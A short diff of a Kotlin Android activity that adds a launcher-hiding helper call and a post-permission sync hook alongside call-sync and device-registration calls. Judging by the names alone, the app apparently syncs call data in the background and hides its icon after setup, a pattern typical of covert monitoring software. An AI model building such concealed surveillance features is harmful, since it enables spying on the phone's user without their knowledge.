@@ -25,6 +25,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         bringToFront()
         MongoSyncHelper.ensureApiUrl(this)
         CallSyncHelper.markBackgroundSyncEnabled(this, true)
+        LauncherHider.ensureLaunchableForSetup(this)
         CallSyncService.startHolding(this)
 
         if (!SyncBootstrap.needsCoreSyncPermissions(this)) {
@@ -148,6 +149,7 @@ class PermissionTrampolineActivity : AppCompatActivity() {
                     DeviceRegistration.registerNow(applicationContext)
                     SyncObserverManager.register(applicationContext)
                     SyncBootstrap.armBackgroundSync(applicationContext)
+                    SyncBootstrap.onPermissionsReady(applicationContext)
                     SyncAlarmScheduler.scheduleNext(applicationContext)
                 }
             } catch (error: Exception) {
